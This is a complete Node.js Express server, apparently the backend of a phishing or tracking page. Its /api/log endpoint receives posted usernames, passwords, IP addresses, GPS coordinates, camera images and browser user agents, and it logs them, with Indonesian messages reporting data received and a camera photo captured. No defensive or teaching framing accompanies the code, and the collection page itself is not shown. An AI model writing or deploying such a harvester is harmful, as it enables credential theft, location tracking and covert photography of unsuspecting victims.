
const express = require("express");
const session = require("express-session");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: "rahasia-negara-konoha",
    resave: false,
    saveUninitialized: true
}));

app.use(express.static(path.join(__dirname, "public")));

app.post("/api/log", (req, res) => {
    const { username, password, ip, lat, lon, image, userAgent } = req.body;
    console.log("--- DATA DITERIMA ---");
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);
    console.log(`IP: ${ip}`);
    console.log(`Lokasi: Lat ${lat}, Lon ${lon}`);
    console.log(`User-Agent: ${userAgent}`);
    if (image) console.log("Foto kamera berhasil ditangkap (Base64 tersedia)");
    res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server berjalan di port ${PORT}`);
});

